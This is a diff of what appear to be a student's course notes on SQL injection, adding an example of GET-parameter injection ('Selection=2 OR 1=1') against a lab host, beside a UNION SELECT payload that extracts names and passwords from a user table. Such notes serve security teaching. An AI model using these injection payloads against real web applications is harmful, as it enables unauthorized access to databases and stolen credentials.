@@ -360,6 +360,17 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/05-sql-injection-sl
     ex 2:
     Audi' Union select id,2,name,pass,5 FROM session.user #
 
+    **SQL on database** GET Method
+    ex for this one is selecting something from a dropdown menu
+    Pay attention to URL bar, it should change for each selection
+
+    http://10.50.28.178/uniondemo.php?Selection=1&Submit=Submit
+
+    http://10.50.28.178/uniondemo.php?Selection=2 OR 1=1 
+    Above, you're selecting something, then adding a boolean condition to true at the end and testing each one.
+    
+    
+    
     
 
     
